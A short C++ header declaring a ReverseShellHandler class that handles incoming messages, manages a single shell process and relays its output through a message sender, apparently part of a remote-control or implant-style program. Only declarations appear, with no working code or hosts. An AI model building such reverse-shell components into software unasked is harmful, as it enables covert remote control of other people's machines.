#pragma once
#include <memory>

#include "IMessageHandler.h"
#include "IMessageSender.h"
#include "ISingleProcessManager.h"

class ReverseShellHandler : public IMessageHandler
{
public:
	explicit ReverseShellHandler(
		std::shared_ptr<IMessageSender> sender);

	void Handle(MessageType type, SharedSpan content) override;

private:
	void ReadOutput(const std::string& line) const;

	std::shared_ptr<IMessageSender> _sender;
	std::unique_ptr<ISingleProcessManager> _manager;
};

